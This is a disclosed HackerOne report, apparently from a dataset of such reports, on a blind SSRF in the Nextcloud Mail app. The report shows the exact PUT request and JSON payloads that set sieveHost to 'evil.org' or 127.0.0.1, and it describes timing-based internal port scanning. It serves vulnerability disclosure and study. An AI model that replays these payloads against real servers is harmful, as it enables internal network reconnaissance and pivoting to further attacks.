---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1741525'
original_report_id: '1741525'
title: Mail app - Blind SSRF via Sierve server fonctionnality and sieveHost parameter
weakness: Server-Side Request Forgery (SSRF)
team_handle: nextcloud
created_at: '2022-10-18T19:24:46.638Z'
disclosed_at: '2023-02-06T21:27:57.263Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 7
asset_identifier: nextcloud/mail
asset_type: SOURCE_CODE
max_severity: critical
tags:
- hackerone
- server-side-request-forgery-ssrf
---

# Mail app - Blind SSRF via Sierve server fonctionnality and sieveHost parameter

## Metadata

- HackerOne Report ID: 1741525
- Weakness: Server-Side Request Forgery (SSRF)
- Program: nextcloud
- Disclosed At: 2023-02-06T21:27:57.263Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Hi everyone,
I would like to report another  Blind SSRF vulnerability through the Nextcloud Mail application.

Tested on latest Mail release : `2.0.1`

## Steps To Reproduce:

Firstly, this report is similar to #1736390 except that it touches a new parameter and a different endpoint.

When adding a filter via a sieve filter server (`mail` application => added mailbox => settings => Sieve filter server), the following request is made : 

```
PUT /apps/mail/api/sieve/account/5 HTTP/2
Host: redacted
Cookie: redactedr
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0
Accept: application/json, text/plain, */*
Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/json
Requesttoken: redacted
Content-Length: 117
Origin: redacted
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers

{"sieveEnabled":true,"sieveHost":"evil.org","sievePort":"80","sieveUser":"","sievePassword":"","sieveSslMode":"none"}
```

The SSRF is found in the `sieveHost` parameter, and provided that the `sieveSslMode` parameter is set to `none`.

```
{"sieveEnabled":true,"sieveHost":"127.0.0.1","sievePort":"80","sieveUser":"","sievePassword":"","sieveSslMode":"none"}
```

Via the Burp Intruder tool, I will guess the open ports on my Nextcloud server. Response time less than 100ms => closed port. Response time higher than 5000ms = open ports and service listening on them.

{F1992720}

Result from Burp Intruder on my NC server : 

{F1992724}

```
Port 80 - Apache2 service
Port 443 - Apache2 service
Port 2222 - SSH ! (critical)
Port 6060 - CrowdSec
Port 8080 - CrowdSec
Port 3306 - MySQL
Port 5432 -  PostgreSQL
Port 6379 - My Redis instance for Nextcloud
```

## Impact

From [OWASP](https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/):

> SSRF flaws occur whenever a web application is fetching a remote resource without validating the user-supplied URL. It allows an attacker to coerce the application to send a crafted request to an unexpected destination, even when protected by a firewall, VPN, or another type of network access control list (ACL).

This vulnerability can allow a malicious individual to map the server and the company's internal network via Nextcloud. This is not demonstrated here in the report but one can scan private subnet ranges to try to guess : 

- Which IP addresses are responding
- Wich ports are open 
- Tried to exploit vulnerable services through this Blind SSRF

Here are some examples of Blind SSRF, which were used as a rebound, to exploit more critical vulnerabilities :

[Here](https://www.kernelpicnic.net/2017/05/29/Pivoting-from-blind-SSRF-to-RCE-with-Hashicorp-Consul.html) is an example of how to use an SSRF blind, as a rebound, to exploit a critical flaw.

Looking forward to exchanging.

Regards,
Supr4s

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
